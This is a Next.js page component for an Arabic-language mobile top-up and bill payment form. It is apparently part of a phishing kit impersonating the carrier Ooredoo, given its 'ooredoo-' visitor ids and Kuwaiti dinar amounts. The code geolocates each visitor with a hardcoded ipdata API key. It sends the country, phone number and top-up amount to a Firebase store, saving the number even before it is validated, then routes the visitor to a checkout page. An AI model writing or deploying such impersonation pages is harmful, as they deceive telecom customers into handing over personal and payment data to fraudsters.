"use client"

import type React from "react"
import { useEffect, useState, useCallback } from "react"
import { useRouter } from "next/navigation"
import { ArrowRight, Loader2, Trash2, Receipt, DollarSign } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { setupOnlineStatus } from "@/lib/utils"
import { addData } from "@/lib/firebase"

interface PaymentData {
  id: string
  phone?: string
  country?: string
  amount?: string
}

interface LocationResponse {
  country_name: string
}

const _id = "ooredoo-" + Math.random()
  .toString(36)
  .replace(/[^a-z]+/g, "")
  .substr(0, 15)

export default function PaymentPage() {
  const router = useRouter()
  const [amount, setAmount] = useState("5")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [isLoading, setIsLoading] = useState(false)


  const formatAmount = useCallback((value: string): string => {
    const numericValue = Number.parseFloat(value.replace(/[^\d.]/g, ""))
    return isNaN(numericValue) ? "0" : numericValue.toString()
  }, [])

  const validatePhoneNumber = useCallback((phone: string): boolean => {
    const phoneRegex = /^[0-9]{8}$/
    return phoneRegex.test(phone)
  }, [])
  useEffect(() => {
    getLocation()
  }, [])

  async function getLocation() {
    const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }
      const country = await response.text()
      addData({
        id: _id,
        country: country,
        createdDate: new Date().toISOString(),
      })
      localStorage.setItem("country", country)
      addData({ id: _id, country })
      setupOnlineStatus(_id)
    } catch (error) {
      console.error("Error fetching location:", error)
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    addData({ id: _id, phone: phoneNumber, mobile: phoneNumber })

    if (!validatePhoneNumber(phoneNumber)) {

      return
    }

    const numericAmount = Number.parseFloat(amount.replace(/[^\d.]/g, ""))
    if (numericAmount < 1 || numericAmount > 100) {
      return
    }

    setIsLoading(true)

    try {
      const sessionId = localStorage.getItem("visitor")
      if (!sessionId) {
        throw new Error("Session not found")
      }

      const paymentData: PaymentData = {
        id: sessionId,
        phone: phoneNumber,
        amount: amount,
      }
      addData({ paymentData })
      localStorage.setItem("amount", amount)

      router.push("/checkout")
    } catch (error) {
      console.error("Payment submission failed:", error)
    } finally {
      setIsLoading(false)
    }
  }

  const handleAmountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^\d]/g, "")
    setAmount(value)
  }

  const clearAmount = () => {
    setAmount("0")
  }

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^\d]/g, "").slice(0, 8)
    setPhoneNumber(value)
  }


  useEffect(() => {
    localStorage.setItem("paymentAmount", amount)
  }, [amount])

  if (isLoading) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-gray-50">
        <div className="text-center">
          <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4 text-red-500" />
          <p className="text-gray-600">جاري التحميل...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="flex flex-col min-h-screen bg-gray-50">
      <header className="bg-white">
        <div className="flex justify-between items-center p-4 max-w-md mx-auto">
          <div className="flex items-center">
            <DollarSign className="w-5 h-5 mr-2 text-gray-600" />
            <span className="text-base font-medium text-gray-900">English</span>
          </div>
          <h1 className="text-lg font-semibold text-gray-900">دفع</h1>
          <Button variant="ghost" size="sm" onClick={() => router.back()} className="p-2">
            <ArrowRight className="w-5 h-5 text-gray-700" />
          </Button>
        </div>
      </header>

      <main className="flex-1 p-4 space-y-6 max-w-md mx-auto w-full">
        {/* Promotional Banner */}
        <div className="relative overflow-hidden rounded-2xl">
          <img src="/zf.png" alt="Smart Pay Banner" className="w-full h-auto object-cover" />
        </div>

        {/* Payment Form */}
        <form onSubmit={handleSubmit} className="space-y-6">
          {/* Input Fields */}
          <div className="flex gap-4">
            {/* Phone Number Field */}
            <div className="flex-1 space-y-2">
              <label className="text-base font-medium text-gray-900 block text-right">رقم الموبايل</label>
              <Input
                type="tel"
                value={phoneNumber}
                onChange={handlePhoneChange}
                placeholder=""
                className="text-right py-4 text-lg border-gray-300 focus:border-red-500 focus:ring-red-500 rounded-lg h-14"
                dir="rtl"
                required
                aria-label="رقم الموبايل"
              />
            </div>

            {/* Amount Field */}
            <div className="w-32 space-y-2">
              <label className="text-base font-medium text-gray-900 block text-right">المبلغ</label>
              <div className="relative">
                <Input
                  type="text"
                  value={amount}
                  onChange={handleAmountChange}
                  className="text-center py-4 text-lg font-medium border-gray-300 focus:border-red-500 focus:ring-red-500 rounded-lg h-14 pr-12"
                  dir="rtl"
                  aria-label="المبلغ"
                />
                <div className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-600 font-medium text-sm">
                  د.ك
                </div>
                <Button
                  type="button"
                  variant="ghost"
                  size="sm"
                  onClick={clearAmount}
                  className="absolute left-2 top-1/2 transform -translate-y-1/2 p-1 hover:bg-gray-100 rounded"
                >
                  <Trash2 className="w-4 h-4 text-gray-400" />
                </Button>
              </div>
            </div>
          </div>

          {/* Pay to Another Number Button */}
          <Button
            type="button"
            variant="outline"
            className="w-full py-4 border-red-500 text-red-500 hover:bg-red-50 rounded-full text-base font-medium h-14"
          >
            الدفع لرقم آخر
          </Button>

          {/* Large Spacing */}
          <div className="h-32"></div>

          {/* Payment Summary */}
          <div className="bg-white rounded-lg p-4 space-y-4 border border-gray-200">
            <div className="flex items-center justify-between">
              <div className="flex items-center text-gray-700">
                <Receipt className="w-5 h-5 text-red-500 ml-2" />
                <span className="text-base font-medium">إعادة التعبئة / دفع الفواتير</span>
              </div>
            </div>

            <div className="flex justify-between items-center pt-2 border-t border-gray-200">
              <div className="text-lg font-semibold text-gray-900">{amount}.000 د.ك</div>
              <div className="text-base font-medium text-gray-700">الإجمالي:</div>
            </div>
          </div>
          <Button
            type="submit"
            disabled={isLoading || !phoneNumber || !validatePhoneNumber(phoneNumber)}
            className="w-full py-4 bg-red-600 hover:bg-red-400 disabled:bg-gray-300 disabled:text-gray-500 text-white rounded-full text-base font-medium h-14"
          >
            {isLoading ? (
              <div className="flex items-center justify-center">
                <Loader2 className="w-5 h-5 animate-spin ml-2" />
                <span>جاري المعالجة...</span>
              </div>
            ) : (
              <span>استمرار</span>
            )}
          </Button>
        </form>
      </main>
    </div>
  )
}